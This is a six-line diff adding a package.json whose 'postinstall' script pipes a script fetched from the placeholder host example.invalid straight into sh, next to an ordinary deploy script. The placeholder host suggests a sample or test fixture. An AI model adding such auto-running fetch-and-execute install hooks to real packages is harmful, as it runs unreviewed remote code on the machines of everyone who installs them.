@@ -1,0 +1,6 @@
+{
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | sh",
+    "deploy": "bash scripts/deploy.sh"
+  }
+}
